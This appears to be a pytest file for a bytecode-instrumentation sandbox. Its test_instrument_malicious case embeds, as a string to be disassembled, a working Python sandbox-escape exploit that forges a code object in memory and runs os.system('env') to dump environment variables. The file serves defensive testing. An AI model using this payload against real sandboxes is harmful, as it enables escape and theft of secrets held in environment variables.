import pytest
import dis
import re
from io import StringIO
from contextlib import redirect_stdout

from .instrument import Instrument

def test_replace_builtins():
    s = """
l = [1,2,3]
x = l.index(2)
print(x)
y = type(x)
print(y)
class X:
 def __init__(self):
  self.xxx = [0, 123]
 def index(self, ix):
  if ix == self.xxx:
   return "happy!!"
  else:
   print(self.xxx.index(123))
   return "sad:(("
xx = X()
print(type(xx))
print(type(xx).__module__=="builtins")
xxx = xx.index(123)
print(xxx)
"""
    c = compile(s, "source", "exec")
    ci = Instrument.instrument(c, replace_builtins=True, instrument=False)
    new_builtins = {"__builtins__": {"__instrumented_index": lambda x, y: 32, "type": type, "__safe_type__": type, "print": print, "__build_class__": __build_class__, "__name__": "DANGEROUS_main"}}
    f = StringIO()
    with redirect_stdout(f):
        exec(c, new_builtins)
    correct_val = f.getvalue()
    f2 = StringIO()
    with redirect_stdout(f2):
        exec(ci, new_builtins)
    our_val = f2.getvalue().replace("32", "1")
    assert correct_val == our_val

def test_instrument():
    source = """x = 3
y = 4
z = x + y"""
    code = compile(source, "test", "exec")
    instrumented_code = Instrument.instrument(code, replace_builtins=False)
    disassembly = dis.Bytecode(instrumented_code).dis()
    exp_disassembly = """  1           0 LOAD_GLOBAL              3 (__instrument__)
              2 CALL_FUNCTION            0
              4 POP_TOP
              6 LOAD_CONST               0 (3)
              8 LOAD_GLOBAL              3 (__instrument__)
             10 CALL_FUNCTION            0
             12 POP_TOP
             14 STORE_NAME               0 (x)

  2          16 LOAD_GLOBAL              3 (__instrument__)
             18 CALL_FUNCTION            0
             20 POP_TOP
             22 LOAD_CONST               1 (4)
             24 LOAD_GLOBAL              3 (__instrument__)
             26 CALL_FUNCTION            0
             28 POP_TOP
             30 STORE_NAME               1 (y)

  3          32 LOAD_GLOBAL              3 (__instrument__)
             34 CALL_FUNCTION            0
             36 POP_TOP
             38 LOAD_NAME                0 (x)
             40 LOAD_GLOBAL              3 (__instrument__)
             42 CALL_FUNCTION            0
             44 POP_TOP
             46 LOAD_NAME                1 (y)
             48 LOAD_GLOBAL              3 (__instrument__)
             50 CALL_FUNCTION            0
             52 POP_TOP
             54 BINARY_ADD
             56 LOAD_GLOBAL              3 (__instrument__)
             58 CALL_FUNCTION            0
             60 POP_TOP
             62 STORE_NAME               2 (z)
             64 LOAD_GLOBAL              3 (__instrument__)
             66 CALL_FUNCTION            0
             68 POP_TOP
             70 LOAD_CONST               2 (None)
             72 LOAD_GLOBAL              3 (__instrument__)
             74 CALL_FUNCTION            0
             76 POP_TOP
             78 RETURN_VALUE
"""
    assert disassembly == exp_disassembly



def test_instrument_malicious():
    source = """# v2: Steal envs
payload_consts = (None, 0, 'BuiltinImporter', 'os', 'env')
payload_names = ('get_board_size', '__closure__', 'cell_contents', '__class__', '__bases__', '__subclasses__', '__name__', 'load_module', 'system')
payload_varnames = ('subs', 'Importer', 'sub', 'imp')
payload = b't\\x00j\\x01d\\x01\\x19\\x00j\\x02j\\x03j\\x04d\\x01\\x19\\x00\\xa0\\x05\\xa1\\x00}\\x00d\\x00}\\x01x\\x1c|\\x00D\\x00]\\x14}\\x02|\\x02j\\x06d\\x02k\\x02r"|\\x02}\\x01P\\x00q"W\\x00|\\x01\\x83\\x00}\\x03|\\x03\\xa0\\x07d\\x03\\xa1\\x01\\xa0\\x08d\\x04\\xa1\\x01\\x01\\x00d\\x00S\\x00'
# v1: Print closure
# payload_consts = (None,)
# payload_names = ('log', 'str', 'get_board_size','__closure__')
# payload = b't\\x00t\\x01t\\x02j\\x03\\x83\\x01\\x83\\x01d\\x00S\\x00'
# v0: Hello world
# payload_consts = (None, 'hello world')
# payload_names = ('log',)
# payload = b't\\x00d\\x01\\x83\\x01d\\x00S\\x00'
evil_struct = {
    'code': payload,
    'consts': payload_consts,
    'names': payload_names,
    'varnames': payload_varnames,
    'freevars': (),
    'cellvars': (),
    'filename': '<dummy>',
    'name': 'evil_code',
    'lnotab': str(len(payload)).encode('utf-8') + b'\\x00',
    'weakreflist': []
}
def make_payload():
    all_bytes = [
        b'\\x00', b'\\x01', b'\\x02', b'\\x03', b'\\x04', b'\\x05', b'\\x06', b'\\x07',
        b'\\x08', b'\\t', b'\\n', b'\\x0b', b'\\x0c', b'\\r', b'\\x0e', b'\\x0f', b'\\x10',
        b'\\x11', b'\\x12', b'\\x13', b'\\x14', b'\\x15', b'\\x16', b'\\x17', b'\\x18',
        b'\\x19', b'\\x1a', b'\\x1b', b'\\x1c', b'\\x1d', b'\\x1e', b'\\x1f', b' ', b'!',
        b'"', b'#', b'$', b'%', b'&', b"'", b'(', b')', b'*', b'+', b',', b'-',
        b'.', b'/', b'0', b'1', b'2', b'3', b'4', b'5', b'6', b'7', b'8', b'9',
        b':', b';', b'<', b'=', b'>', b'?', b'@', b'A', b'B', b'C', b'D', b'E',
        b'F', b'G', b'H', b'I', b'J', b'K', b'L', b'M', b'N', b'O', b'P', b'Q',
        b'R', b'S', b'T', b'U', b'V', b'W', b'X', b'Y', b'Z', b'[', b'\\\\', b']',
        b'^', b'_', b'`', b'a', b'b', b'c', b'd', b'e', b'f', b'g', b'h', b'i',
        b'j', b'k', b'l', b'm', b'n', b'o', b'p', b'q', b'r', b's', b't', b'u',
        b'v', b'w', b'x', b'y', b'z', b'{', b'|', b'}', b'~', b'\\x7f', b'\\x80',
        b'\\x81', b'\\x82', b'\\x83', b'\\x84', b'\\x85', b'\\x86', b'\\x87', b'\\x88',
        b'\\x89', b'\\x8a', b'\\x8b', b'\\x8c', b'\\x8d', b'\\x8e', b'\\x8f', b'\\x90',
        b'\\x91', b'\\x92', b'\\x93', b'\\x94', b'\\x95', b'\\x96', b'\\x97', b'\\x98',
        b'\\x99', b'\\x9a', b'\\x9b', b'\\x9c', b'\\x9d', b'\\x9e', b'\\x9f', b'\\xa0',
        b'\\xa1', b'\\xa2', b'\\xa3', b'\\xa4', b'\\xa5', b'\\xa6', b'\\xa7', b'\\xa8',
        b'\\xa9', b'\\xaa', b'\\xab', b'\\xac', b'\\xad', b'\\xae', b'\\xaf', b'\\xb0',
        b'\\xb1', b'\\xb2', b'\\xb3', b'\\xb4', b'\\xb5', b'\\xb6', b'\\xb7', b'\\xb8',
        b'\\xb9', b'\\xba', b'\\xbb', b'\\xbc', b'\\xbd', b'\\xbe', b'\\xbf', b'\\xc0',
        b'\\xc1', b'\\xc2', b'\\xc3', b'\\xc4', b'\\xc5', b'\\xc6', b'\\xc7', b'\\xc8',
        b'\\xc9', b'\\xca', b'\\xcb', b'\\xcc', b'\\xcd', b'\\xce', b'\\xcf', b'\\xd0',
        b'\\xd1', b'\\xd2', b'\\xd3', b'\\xd4', b'\\xd5', b'\\xd6', b'\\xd7', b'\\xd8',
        b'\\xd9', b'\\xda', b'\\xdb', b'\\xdc', b'\\xdd', b'\\xde', b'\\xdf', b'\\xe0',
        b'\\xe1', b'\\xe2', b'\\xe3', b'\\xe4', b'\\xe5', b'\\xe6', b'\\xe7', b'\\xe8',
        b'\\xe9', b'\\xea', b'\\xeb', b'\\xec', b'\\xed', b'\\xee', b'\\xef', b'\\xf0',
        b'\\xf1', b'\\xf2', b'\\xf3', b'\\xf4', b'\\xf5', b'\\xf6', b'\\xf7', b'\\xf8',
        b'\\xf9', b'\\xfa', b'\\xfb', b'\\xfc', b'\\xfd', b'\\xfe', b'\\xff']
    def pointer_to_bytes(p):
        out = b''
        for i in range(8):
            out = out + all_bytes[p % 256]
            p = p // 256
        return out
    evil_array = (
        b'\\x00\\x00\\x00\\x00' + # flags
        b'\\x9a\\x02\\x00\\x00' + # first line no = 666
        pointer_to_bytes(id(evil_struct['code'])) +
        pointer_to_bytes(id(evil_struct['consts'])) +
        pointer_to_bytes(id(evil_struct['names'])) +
        pointer_to_bytes(id(evil_struct['varnames'])) +
        pointer_to_bytes(id(evil_struct['freevars'])) +
        pointer_to_bytes(id(evil_struct['cellvars'])) +
        pointer_to_bytes(0) + # cell2arg
        pointer_to_bytes(id(evil_struct['filename'])) +
        pointer_to_bytes(id(evil_struct['name'])) +
        pointer_to_bytes(id(evil_struct['lnotab'])) +
        pointer_to_bytes(0) + # zombieframe
        pointer_to_bytes(0) + # weakreflist
        pointer_to_bytes(0) # extra
    )
    for i in range(3*256):
        test_evil_array = evil_array + chr(i%256).encode('utf-8') + chr(i//256).encode('utf-8')
        h = hash(test_evil_array) # cache the hash
        if h < 0:
            h += 2**64
        i1, i2 = h % 2**32, h >> 32
        if i1 < 2**28 and i2 < 2**28: break
    evil_array = test_evil_array
    return evil_array

# Call into hacked C struct mimicking PyCodeObject
def call_code(payload, nargs):
    a = True + (True if True or False else False)
    {}
    {}
    {}
    {}
    a = payload + (payload if True or False else False)
    b = b = b = b = b = {}
    {}
    {}
    {}
    {}
    {}
    def evil():
        pass
    evil(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
         0,0,0,0,0,0,0,0,0)

def turn():
    evil_array = make_payload()
    call_code(evil_array, len(evil_array))
"""
    code = compile(source, "source", "exec")
    instrumented_code = Instrument.instrument(code, replace_builtins=False)
    disassembly = dis.Bytecode(instrumented_code).dis()
    exp_disassembly = """  2           0 LOAD_GLOBAL             11 (__instrument__)
              2 CALL_FUNCTION            0
              4 POP_TOP
              6 LOAD_CONST               0 ((None, 0, 'BuiltinImporter', 'os', 'env'))
              8 LOAD_GLOBAL             11 (__instrument__)
             10 CALL_FUNCTION            0
             12 POP_TOP
             14 STORE_NAME               0 (payload_consts)

  3          16 LOAD_GLOBAL             11 (__instrument__)
             18 CALL_FUNCTION            0
             20 POP_TOP
             22 LOAD_CONST               1 (('get_board_size', '__closure__', 'cell_contents', '__class__', '__bases__', '__subclasses__', '__name__', 'load_module', 'system'))
             24 LOAD_GLOBAL             11 (__instrument__)
             26 CALL_FUNCTION            0
             28 POP_TOP
             30 STORE_NAME               1 (payload_names)

  4          32 LOAD_GLOBAL             11 (__instrument__)
             34 CALL_FUNCTION            0
             36 POP_TOP
             38 LOAD_CONST               2 (('subs', 'Importer', 'sub', 'imp'))
             40 LOAD_GLOBAL             11 (__instrument__)
             42 CALL_FUNCTION            0
             44 POP_TOP
             46 STORE_NAME               2 (payload_varnames)

  5          48 LOAD_GLOBAL             11 (__instrument__)
             50 CALL_FUNCTION            0
             52 POP_TOP
             54 LOAD_CONST               3 (b't\\x00j\\x01d\\x01\\x19\\x00j\\x02j\\x03j\\x04d\\x01\\x19\\x00\\xa0\\x05\\xa1\\x00}\\x00d\\x00}\\x01x\\x1c|\\x00D\\x00]\\x14}\\x02|\\x02j\\x06d\\x02k\\x02r"|\\x02}\\x01P\\x00q"W\\x00|\\x01\\x83\\x00}\\x03|\\x03\\xa0\\x07d\\x03\\xa1\\x01\\xa0\\x08d\\x04\\xa1\\x01\\x01\\x00d\\x00S\\x00')
             56 LOAD_GLOBAL             11 (__instrument__)
             58 CALL_FUNCTION            0
             60 POP_TOP
             62 STORE_NAME               3 (payload)

 15          64 LOAD_GLOBAL             11 (__instrument__)
             66 CALL_FUNCTION            0
             68 POP_TOP
             70 LOAD_NAME                3 (payload)

 16          72 LOAD_GLOBAL             11 (__instrument__)
             74 CALL_FUNCTION            0
             76 POP_TOP
             78 LOAD_NAME                0 (payload_consts)

 17          80 LOAD_GLOBAL             11 (__instrument__)
             82 CALL_FUNCTION            0
             84 POP_TOP
             86 LOAD_NAME                1 (payload_names)

 18          88 LOAD_GLOBAL             11 (__instrument__)
             90 CALL_FUNCTION            0
             92 POP_TOP
             94 LOAD_NAME                2 (payload_varnames)

 19          96 LOAD_GLOBAL             11 (__instrument__)
             98 CALL_FUNCTION            0
            100 POP_TOP
            102 LOAD_CONST               4 (())

 20         104 LOAD_GLOBAL             11 (__instrument__)
            106 CALL_FUNCTION            0
            108 POP_TOP
            110 LOAD_CONST               4 (())

 21         112 LOAD_GLOBAL             11 (__instrument__)
            114 CALL_FUNCTION            0
            116 POP_TOP
            118 LOAD_CONST               5 ('<dummy>')

 22         120 LOAD_GLOBAL             11 (__instrument__)
            122 CALL_FUNCTION            0
            124 POP_TOP
            126 LOAD_CONST               6 ('evil_code')

 23         128 LOAD_GLOBAL             11 (__instrument__)
            130 CALL_FUNCTION            0
            132 POP_TOP
            134 LOAD_NAME                4 (str)
            136 LOAD_GLOBAL             11 (__instrument__)
            138 CALL_FUNCTION            0
            140 POP_TOP
            142 LOAD_NAME                5 (len)
            144 LOAD_GLOBAL             11 (__instrument__)
            146 CALL_FUNCTION            0
            148 POP_TOP
            150 LOAD_NAME                3 (payload)
            152 LOAD_GLOBAL             11 (__instrument__)
            154 CALL_FUNCTION            0
            156 POP_TOP
            158 CALL_FUNCTION            1
            160 LOAD_GLOBAL             11 (__instrument__)
            162 CALL_FUNCTION            0
            164 POP_TOP
            166 CALL_FUNCTION            1
            168 LOAD_GLOBAL             11 (__instrument__)
            170 CALL_FUNCTION            0
            172 POP_TOP
            174 LOAD_METHOD              6 (encode)
            176 LOAD_GLOBAL             11 (__instrument__)
            178 CALL_FUNCTION            0
            180 POP_TOP
            182 LOAD_CONST               7 ('utf-8')
            184 LOAD_GLOBAL             11 (__instrument__)
            186 CALL_FUNCTION            0
            188 POP_TOP
            190 CALL_METHOD              1
            192 LOAD_GLOBAL             11 (__instrument__)
            194 CALL_FUNCTION            0
            196 POP_TOP
            198 LOAD_CONST               8 (b'\\x00')
            200 LOAD_GLOBAL             11 (__instrument__)
            202 CALL_FUNCTION            0
            204 POP_TOP
            206 BINARY_ADD

 24         208 LOAD_GLOBAL             11 (__instrument__)
            210 CALL_FUNCTION            0
            212 POP_TOP
            214 BUILD_LIST               0

 14         216 LOAD_GLOBAL             11 (__instrument__)
            218 CALL_FUNCTION            0
            220 POP_TOP
            222 LOAD_CONST               9 (('code', 'consts', 'names', 'varnames', 'freevars', 'cellvars', 'filename', 'name', 'lnotab', 'weakreflist'))
            224 LOAD_GLOBAL             11 (__instrument__)
            226 CALL_FUNCTION            0
            228 POP_TOP
            230 BUILD_CONST_KEY_MAP     10
            232 LOAD_GLOBAL             11 (__instrument__)
            234 CALL_FUNCTION            0
            236 POP_TOP
            238 STORE_NAME               7 (evil_struct)

 26         240 LOAD_GLOBAL             11 (__instrument__)
            242 CALL_FUNCTION            0
            244 POP_TOP
            246 LOAD_CONST              10 (<code object make_payload at 0x10ea58390, file "source", line 26>)
            248 LOAD_GLOBAL             11 (__instrument__)
            250 CALL_FUNCTION            0
            252 POP_TOP
            254 LOAD_CONST              11 ('make_payload')
            256 LOAD_GLOBAL             11 (__instrument__)
            258 CALL_FUNCTION            0
            260 POP_TOP
            262 MAKE_FUNCTION            0
            264 LOAD_GLOBAL             11 (__instrument__)
            266 CALL_FUNCTION            0
            268 POP_TOP
            270 STORE_NAME               8 (make_payload)

 90         272 LOAD_GLOBAL             11 (__instrument__)
            274 CALL_FUNCTION            0
            276 POP_TOP
            278 LOAD_CONST              12 (<code object call_code at 0x10ea31b70, file "source", line 90>)
            280 LOAD_GLOBAL             11 (__instrument__)
            282 CALL_FUNCTION            0
            284 POP_TOP
            286 LOAD_CONST              13 ('call_code')
            288 LOAD_GLOBAL             11 (__instrument__)
            290 CALL_FUNCTION            0
            292 POP_TOP
            294 MAKE_FUNCTION            0
            296 LOAD_GLOBAL             11 (__instrument__)
            298 CALL_FUNCTION            0
            300 POP_TOP
            302 STORE_NAME               9 (call_code)

110         304 LOAD_GLOBAL             11 (__instrument__)
            306 CALL_FUNCTION            0
            308 POP_TOP
            310 LOAD_CONST              14 (<code object turn at 0x10ea31420, file "source", line 110>)
            312 LOAD_GLOBAL             11 (__instrument__)
            314 CALL_FUNCTION            0
            316 POP_TOP
            318 LOAD_CONST              15 ('turn')
            320 LOAD_GLOBAL             11 (__instrument__)
            322 CALL_FUNCTION            0
            324 POP_TOP
            326 MAKE_FUNCTION            0
            328 LOAD_GLOBAL             11 (__instrument__)
            330 CALL_FUNCTION            0
            332 POP_TOP
            334 STORE_NAME              10 (turn)
            336 LOAD_GLOBAL             11 (__instrument__)
            338 CALL_FUNCTION            0
            340 POP_TOP
            342 LOAD_CONST              16 (None)
            344 LOAD_GLOBAL             11 (__instrument__)
            346 CALL_FUNCTION            0
            348 POP_TOP
            350 RETURN_VALUE
"""
    disassembly = re.sub(r"at 0x[0-9a-f]+, ", "at ADDRESS, ", disassembly)
    exp_disassembly = re.sub(r"at 0x[0-9a-f]+, ", "at ADDRESS, ", exp_disassembly)
    assert disassembly == exp_disassembly
